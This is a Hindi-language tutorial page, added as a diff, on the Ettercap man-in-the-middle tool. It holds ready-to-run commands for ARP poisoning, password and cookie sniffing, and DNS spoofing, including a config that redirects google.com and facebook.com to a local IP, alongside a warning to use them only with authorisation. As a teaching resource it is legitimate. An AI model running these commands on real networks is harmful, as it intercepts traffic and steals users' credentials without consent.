@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Ettercap - Ethical Learn | साइबर सिक्योरिटी टूल</title>
+    <link rel="stylesheet" href="../style.css">
+    <style>
+        .tool-detail {
+            max-width: 1200px;
+            margin: 2rem auto;
+            padding: 2rem;
+            background: white;
+            border-radius: 1.5rem;
+            box-shadow: 0 4px 14px rgba(0,0,0,0.1);
+        }
+        .tool-detail h1 {
+            color: #1f6392;
+            margin-bottom: 1rem;
+            font-size: 2rem;
+        }
+        .tool-detail h3 {
+            margin: 1.8rem 0 0.8rem 0;
+            color: #0f2c3d;
+            border-left: 4px solid #1f6392;
+            padding-left: 12px;
+        }
+        .tool-detail pre {
+            background: #1e2a3a;
+            color: #eef4ff;
+            padding: 1rem;
+            border-radius: 0.8rem;
+            overflow-x: auto;
+            margin: 0.8rem 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+        .tool-detail .cmd-note {
+            color: #4a6a7a;
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+            padding-left: 0.5rem;
+            border-left: 3px solid #7bc6e6;
+        }
+        .tool-detail ul {
+            margin-left: 1.5rem;
+            margin-top: 0.5rem;
+        }
+        .tool-detail li {
+            margin: 0.5rem 0;
+            line-height: 1.5;
+        }
+        .tool-detail a {
+            color: #1f6392;
+            text-decoration: none;
+        }
+        .tool-detail a:hover {
+            text-decoration: underline;
+        }
+        .back-link {
+            display: inline-block;
+            margin-top: 2rem;
+            background: #1f6392;
+            color: white;
+            padding: 0.8rem 1.5rem;
+            border-radius: 2rem;
+            text-decoration: none;
+            border: none;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: 0.2s;
+        }
+        .back-link:hover {
+            background: #0f4b6e;
+            transform: scale(0.98);
+        }
+        .badge {
+            display: inline-block;
+            background: #eef2fa;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            margin-right: 8px;
+            color: #1f6392;
+        }
+        hr {
+            margin: 1.5rem 0;
+            border-color: #e0e7f0;
+        }
+        .highlight {
+            background: #f0f7ff;
+            padding: 0.5rem;
+            border-radius: 8px;
+            margin: 0.5rem 0;
+        }
+        @media (max-width: 780px) {
+            .tool-detail {
+                margin: 1rem;
+                padding: 1.2rem;
+            }
+            .tool-detail h1 {
+                font-size: 1.5rem;
+            }
+            pre {
+                font-size: 0.7rem;
+            }
+        }
+    </style>
+        <!-- Google AdSense Code -->
+    <meta name="google-adsense-account" content="ca-pub-6124052333813612">
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6124052333813612"
+     crossorigin="anonymous"></script>
+</head>
+<body>
+
+<header>
+    <div class="navbar">
+        <div class="logo-area">
+            <div class="ethical-logo"><span>EL</span></div>
+            <div class="logo-text"><h1>Ethical Learn</h1><p>cyber security hub</p></div>
+        </div>
+        <div class="nav-links">
+            <a href="../index.html">Home</a>
+            <a href="#" id="navToolsTrigger">Tools</a>
+            <a href="about.html" id="navAbout">About</a>
+            <a href="contant.html" id="navComment">Comment</a>
+        </div>
+        <button class="menu-btn" id="mainToolsMenuBtn"><span class="menu-icon">🛠️</span> Tools Menu</button>
+        <button class="mobile-menu-icon" id="mobileMenuToggle">☰</button>
+    </div>
+    <div id="mobileMenuPanel" style="display: none; background:#0e1c2c; padding: 1rem 2rem; flex-direction: column; gap: 1rem; border-bottom: 1px solid #2c7da0;">
+        <a href="../index.html" style="color:white; text-decoration:none;">🏠 Home</a>
+        <a href="#" id="mobileTools" style="color:white; text-decoration:none;">🛠️ Tools</a>
+        <a href="#" id="mobileAbout" style="color:white; text-decoration:none;">📖 About</a>
+        <a href="#" id="mobileComment" style="color:white; text-decoration:none;">💬 Comment</a>
+    </div>
+</header>
+
+<main>
+  <!-- Header Ad -->
+<div class="ad-container ad-header" style="max-width: 1200px; margin: 10px auto;">
+    <ins class="adsbygoogle"
+         style="display:block"
+         data-ad-client="ca-pub-6124052333813612"
+         data-ad-slot="XXXXXXXXXX"
+         data-ad-format="auto"
+         data-full-width-responsive="true"></ins>
+    <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+</div>
+    <div class="tool-detail">
+        <h1>🐘 Ettercap - Man-in-the-Middle Attack Tool</h1>
+        <p><span class="badge">🔍 MITM Attacks</span> <span class="badge">📡 Network Sniffer</span> <span class="badge">🕸️ ARP Poisoning</span></p>
+        <p><strong>Category:</strong> 7️⃣ Sniffing & Spoofing</p>
+        <hr>
+
+        <h3>📝 Description</h3>
+        <p>Ettercap एक शक्तिशाली मैन-इन-द-मिडिल (MITM) अटैक टूल है जो लैन (LAN) नेटवर्क पर काम करता है। यह ARP स्पूफिंग, DNS स्पूफिंग, और सेशन हाईजैकिंग जैसे अटैक कर सकता है। Ettercap लाइव कनेक्शन को स्निफ करता है, पासवर्ड चुराता है, और ट्रैफिक को रीडायरेक्ट कर सकता है। यह ग्राफिकल इंटरफेस (GUI) और कमांड लाइन (CLI) दोनों में उपलब्ध है।</p>
+        <p><strong>विशेषता:</strong> Ettercap की सबसे बड़ी खासियत है इसकी ARP पॉइज़निंग क्षमता। यह नेटवर्क में दो होस्ट्स के बीच का ट्रैफिक खुद से होकर गुजार सकता है, जिससे वह सारा डेटा देख और मॉडिफाई कर सकता है।</p>
+
+        <h3>📦 Installation</h3>
+        <p><strong>Kali Linux (पहले से इंस्टॉल):</strong></p>
+        <pre>ettercap -h</pre>
+        <p><strong>Ubuntu/Debian:</strong></p>
+        <pre>sudo apt update
+sudo apt install ettercap-graphical -y</pre>
+        <p><strong>GitHub से इंस्टॉल:</strong></p>
+        <pre>git clone https://github.com/Ettercap/ettercap.git
+cd ettercap
+mkdir build
+cd build
+cmake ..
+make
+sudo make install</pre>
+
+        <h3>💻 Common Commands (उदाहरण सहित)</h3>
+        
+        <div class="highlight">
+            <p><strong>📌 Ettercap GUI शुरू करना:</strong></p>
+            <pre>sudo ettercap -G</pre>
+            <div class="cmd-note">👉 <strong>उदाहरण:</strong> ग्राफिकल इंटरफेस खुलता है। Sniff → Unified Sniffing → इंटरफेस चुनें (eth0/wlan0)।</div>
+        </div>
+        
+        <p><strong>🔹 1. ARP पॉइज़निंग अटैक (मैन-इन-द-मिडिल):</strong></p>
+        <pre>sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> गेटवे (192.168.1.1) और टारगेट (192.168.1.100) के बीच MITM अटैक करता है। सारा ट्रैफिक आपसे होकर जाएगा।</div>
+
+        <p><strong>🔹 2. सभी होस्ट्स के बीच ARP पॉइज़निंग:</strong></p>
+        <pre>sudo ettercap -T -M arp:remote // //</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> पूरे नेटवर्क के सभी होस्ट्स के बीच MITM अटैक करता है।</div>
+
+        <p><strong>🔹 3. पासवर्ड स्निफिंग (HTTP, FTP, Telnet):</strong></p>
+        <pre>sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100// -P autoadd</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> -P autoadd प्लगइन से पासवर्ड ऑटोमेटिक कैप्चर होते हैं।</div>
+
+        <p><strong>🔹 4. DNS स्पूफिंग:</strong></p>
+        <pre>sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100// -P dns_spoof</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> DNS रिक्वेस्ट को फेक रिस्पॉन्स देता है (etter.dns फाइल में कॉन्फ़िगर करें)।</div>
+
+        <p><strong>🔹 5. नेटवर्क होस्ट्स स्कैन करना:</strong></p>
+        <pre>sudo ettercap -T -s</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> आसपास के सभी लाइव होस्ट्स की सूची बनाता है।</div>
+
+        <p><strong>🔹 6. यूनिकास्ट स्निफिंग (ARP पॉइज़निंग के बिना):</strong></p>
+        <pre>sudo ettercap -T -M uni /192.168.1.100//</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> सिर्फ टारगेट का ट्रैफिक स्निफ करता है (प्रोमिस्क्युअस मोड में)।</div>
+
+        <p><strong>🔹 7. प्लगइन्स की लिस्ट देखना:</strong></p>
+        <pre>sudo ettercap -T -P list</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> सभी उपलब्ध प्लगइन्स दिखाता है (autoadd, dns_spoof, grep, etc.)।</div>
+
+        <p><strong>🔹 8. कैप्चर को फाइल में सेव करना:</strong></p>
+        <pre>sudo ettercap -T -M arp:remote // // -w capture.pcap</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> कैप्चर किए गए पैकेट्स को capture.pcap फाइल में सेव करता है।</div>
+
+        <p><strong>🔹 9. फिल्टर के साथ स्निफिंग:</strong></p>
+        <pre>sudo ettercap -T -M arp:remote // // -F filter.ef</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> कस्टम फिल्टर लगाता है (पैकेट्स को मॉडिफाई या ब्लॉक करने के लिए)।</div>
+
+        <p><strong>🔹 10. स्पेसिफिक पोर्ट पर स्निफिंग:</strong></p>
+        <pre>sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100// -p</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> -p सिर्फ TCP/UDP पैकेट्स स्निफ करता है।</div>
+
+        <h3>🎯 Ettercap के प्लगइन्स:</h3>
+        <ul>
+            <li><strong>autoadd:</strong> ऑटोमेटिक रूप से नए होस्ट्स को टारगेट में जोड़ता है</li>
+            <li><strong>dns_spoof:</strong> DNS स्पूफिंग (etter.dns फाइल से कॉन्फ़िगर)</li>
+            <li><strong>chk_poison:</strong> ARP पॉइज़निंग चेक करता है</li>
+            <li><strong>grep:</strong> पैकेट्स में स्ट्रिंग सर्च करता है</li>
+            <li><strong>isolate:</strong> होस्ट्स को नेटवर्क से आइसोलेट करता है</li>
+            <li><strong>stp_man:</strong> STP (Spanning Tree Protocol) मैनिपुलेशन</li>
+            <li><strong>rand_flood:</strong> रैंडम MAC एड्रेस से फ्लडिंग</li>
+        </ul>
+
+        <h3>🎯 Use Cases (उपयोग के तरीके)</h3>
+        <ul>
+            <li><strong>ARP पॉइज़निंग (MITM):</strong> नेटवर्क ट्रैफिक को इंटरसेप्ट करना और देखना।</li>
+            <li><strong>पासवर्ड स्निफिंग:</strong> HTTP, FTP, Telnet, IMAP, POP3 से पासवर्ड चुराना।</li>
+            <li><strong>DNS स्पूफिंग:</strong> यूजर को फेक वेबसाइट पर रीडायरेक्ट करना।</li>
+            <li><strong>सेशन हाईजैकिंग:</strong> HTTP सेशन कुकी चुराना।</li>
+            <li><strong>नेटवर्क सिक्योरिटी ऑडिट:</strong> अपने नेटवर्क में ARP स्पूफिंग वल्नरेबिलिटी चेक करना।</li>
+        </ul>
+
+        <h3>⚙️ Key Features (मुख्य विशेषताएँ)</h3>
+        <ul>
+            <li>✔️ ARP पॉइज़निंग (Man-in-the-Middle)</li>
+            <li>✔️ DNS स्पूफिंग</li>
+            <li>✔️ पासवर्ड स्निफिंग (HTTP, FTP, Telnet, IMAP, POP3, etc.)</li>
+            <li>✔️ यूनिकास्ट और मल्टीकास्ट स्निफिंग</li>
+            <li>✔️ 20+ प्लगइन्स</li>
+            <li>✔️ कस्टम फिल्टर सपोर्ट</li>
+            <li>✔️ ग्राफिकल और कमांड लाइन इंटरफेस</li>
+            <li>✔️ लाइव कनेक्शन स्निफिंग</li>
+            <li>✔️ पैकेट कैप्चर और सेव</li>
+            <li>✔️ क्रॉस-प्लेटफॉर्म (Linux, macOS, Windows)</li>
+            <li>✔️ ओपन-सोर्स और फ्री</li>
+        </ul>
+
+        <div class="highlight">
+            <p><strong>📌 Ettercap फिल्टर बनाना:</strong></p>
+            <pre># filter.ef फाइल बनाने के लिए:
+echo 'if (ip.proto == TCP && tcp.dst == 80) {
+    msg("HTTP request detected\\n");
+}' > filter.txt
+etterfilter filter.txt -o filter.ef
+sudo ettercap -T -M arp:remote // // -F filter.ef</pre>
+            <div class="cmd-note">👉 <strong>उदाहरण:</strong> HTTP रिक्वेस्ट डिटेक्ट करने वाला फिल्टर बनाता है।</div>
+        </div>
+
+        <div class="highlight">
+            <p><strong>📌 DNS स्पूफिंग कॉन्फ़िगरेशन (etter.dns):</strong></p>
+            <pre># /etc/ettercap/etter.dns फाइल में डालें:
+*.google.com A 192.168.1.100
+www.facebook.com A 192.168.1.100
+*.example.com A 192.168.1.100</pre>
+            <div class="cmd-note">👉 <strong>उदाहरण:</strong> google.com और facebook.com को 192.168.1.100 पर रीडायरेक्ट करता है।</div>
+        </div>
+
+        <div class="highlight">
+            <p><strong>📌 Ettercap vs Bettercap:</strong></p>
+            <ul>
+                <li><strong>Ettercap:</strong> पुराना, स्टेबल, सिंपल, कमांड लाइन और GUI दोनों</li>
+                <li><strong>Bettercap:</strong> नया, ज्यादा फीचर्स, HTTPS सपोर्ट, रियल-टाइम API, मॉड्यूलर</li>
+                <li><strong>अनुशंसा:</strong> Ettercap सिंपल MITM और स्निफिंग के लिए, Bettercap एडवांस्ड अटैक के लिए।</li>
+            </ul>
+        </div>
+
+        <div class="highlight">
+            <p><strong>📌 Ettercap के लिए सुझाव:</strong></p>
+            <ul>
+                <li>हमेशा ARP पॉइज़निंग से पहले IP फॉरवर्डिंग चालू करें: <code>echo 1 > /proc/sys/net/ipv4/ip_forward</code></li>
+                <li>GUI मोड (-G) बिगिनर्स के लिए आसान है</li>
+                <li>पासवर्ड स्निफिंग के लिए -P autoadd प्लगइन का उपयोग करें</li>
+                <li>DNS स्पूफिंग के लिए etter.dns फाइल को कॉन्फ़िगर करें</li>
+                <li>प्रोडक्शन नेटवर्क पर सावधानी से उपयोग करें</li>
+            </ul>
+        </div>
+
+        <h3>🔗 Official Resources</h3>
+        <ul>
+            <li><strong>Official Website:</strong> <a href="https://www.ettercap-project.org" target="_blank">https://www.ettercap-project.org</a></li>
+            <li><strong>GitHub Repository:</strong> <a href="https://github.com/Ettercap/ettercap" target="_blank">https://github.com/Ettercap/ettercap</a></li>
+            <li><strong>Documentation:</strong> <a href="https://www.ettercap-project.org/documentation.html" target="_blank">Ettercap Docs</a></li>
+            <li><strong>Kali Linux Tools:</strong> <a href="https://www.kali.org/tools/ettercap/" target="_blank">Kali Ettercap Page</a></li>
+        </ul>
+
+        <h3>🔧 Related Tools (समान उपकरण)</h3>
+        <ul>
+            <li><strong>Bettercap:</strong> Ettercap का एडवांस्ड वर्शन</li>
+            <li><strong>Wireshark:</strong> पैकेट एनालिसिस</li>
+            <li><strong>tcpdump:</strong> कमांड लाइन पैकेट कैप्चर</li>
+            <li><strong>arpspoof:</strong> ARP स्पूफिंग टूल (dsniff सुइट)</li>
+            <li><strong>MITMf:</strong> फ्रेमवर्क फॉर MITM अटैक्स</li>
+        </ul>
+
+        <h3>⚠️ Important Note (सावधानी)</h3>
+        <p><strong>Ettercap एक शक्तिशाली MITM टूल है। इसका उपयोग केवल उन्हीं नेटवर्क पर करें जिनकी आपको लिखित अनुमति हो। बिना अनुमति के ARP पॉइज़निंग, पासवर्ड स्निफिंग, या DNS स्पूफिंग करना कानूनी अपराध है। हमेशा अपने खुद के नेटवर्क, CTF चैलेंज, या बग बाउंटी प्रोग्राम पर ही प्रैक्टिस करें। ARP पॉइज़निंग से नेटवर्क में अस्थिरता आ सकती है, इसलिए प्रोडक्शन नेटवर्क पर सावधानी से उपयोग करें।</strong></p>
+
+        <button class="back-link" onclick="window.location.href='../index.html'">← Back to Home</button>
+    </div>
+</main>
+
+<footer>
+    <p>© 2025 Ethical Learn — Empowering security researchers. All tools are for authorized testing only.</p>
+</footer>
+
+<script>
+    function openOverlay() {
+        let overlay = document.getElementById("globalToolsOverlay");
+        if (!overlay) {
+            overlay = document.createElement("div");
+            overlay.id = "globalToolsOverlay";
+            overlay.className = "tools-overlay";
+            overlay.innerHTML = `
+                <div class="tools-container">
+                    <button class="close-menu" id="closeOverlayBtnGlobal">✕</button>
+                    <h2 style="color:white; margin-bottom:0.5rem;">🛡️ Security Tools Arsenal</h2>
+                    <p style="color:#bbd4f0; margin-bottom:1rem;">Click any tool to open its dedicated page</p>
+                    <div class="tools-grid" id="globalToolsGrid"></div>
+                </div>
+            `;
+            document.body.appendChild(overlay);
+            document.getElementById("closeOverlayBtnGlobal")?.addEventListener("click", () => overlay.classList.remove("open"));
+            overlay.addEventListener("click", (e) => { if (e.target === overlay) overlay.classList.remove("open"); });
+            const tools = ["Nmap", "Maltego", "theHarvester", "Recon-ng", "dnsenum", "dnsrecon", "Nikto", "OpenVAS", "OWASP ZAP", "SQLmap", "Burp Suite", "Commix", "Skipfish", "Wfuzz", "Hydra", "Hashcat", "John the Ripper", "Medusa", "Aircrack-ng", "Reaver", "Kismet", "Wifite", "Metasploit", "BeEF", "Armitage", "Wireshark", "Ettercap", "Bettercap", "Autopsy", "Binwalk", "Foremost"];
+            const grid = document.getElementById("globalToolsGrid");
+            if (grid) {
+                grid.className = "tools-grid";
+                let html = '';
+                tools.forEach(tool => {
+                    let filename = tool.toLowerCase().replace(/ /g, '-').replace(/[^a-z0-9-]/g, '');
+                    if (tool === "John the Ripper") filename = "john-the-ripper";
+                    if (tool === "OWASP ZAP") filename = "owasp-zap";
+                    if (tool === "Burp Suite") filename = "burpsuite";
+                    if (tool === "Recon-ng") filename = "recon-ng";
+                    if (tool === "theHarvester") filename = "theharvester";
+                    if (tool === "Aircrack-ng") filename = "aircrack-ng";
+                    html += `<div class="tool-category"><ul class="tool-list"><li><a href="../tools/${filename}.html">🔧 ${tool}</a></li></ul></div>`;
+                });
+                grid.innerHTML = html;
+            }
+        }
+        overlay.classList.add("open");
+    }
+    document.getElementById("navToolsTrigger")?.addEventListener("click", (e) => { e.preventDefault(); openOverlay(); });
+    document.getElementById("mainToolsMenuBtn")?.addEventListener("click", () => openOverlay());
+    const mobileToggle = document.getElementById("mobileMenuToggle");
+    const mobilePanel = document.getElementById("mobileMenuPanel");
+    if (mobileToggle && mobilePanel) {
+        mobileToggle.addEventListener("click", () => { mobilePanel.style.display = mobilePanel.style.display === "none" || mobilePanel.style.display === "" ? "flex" : "none"; });
+        document.getElementById("mobileTools")?.addEventListener("click", (e) => { e.preventDefault(); openOverlay(); mobilePanel.style.display = "none"; });
+        document.getElementById("mobileAbout")?.addEventListener("click", (e) => { e.preventDefault(); window.location.href = "../index.html#about"; });
+        document.getElementById("mobileComment")?.addEventListener("click", (e) => { e.preventDefault(); window.location.href = "../index.html#comment"; });
+    }
+    document.getElementById("navAbout")?.addEventListener("click", (e) => { e.preventDefault(); window.location.href = "../index.html#about"; });
+    document.getElementById("navComment")?.addEventListener("click", (e) => { e.preventDefault(); window.location.href = "../index.html#comment"; });
+</script>
+</body>
+</html>
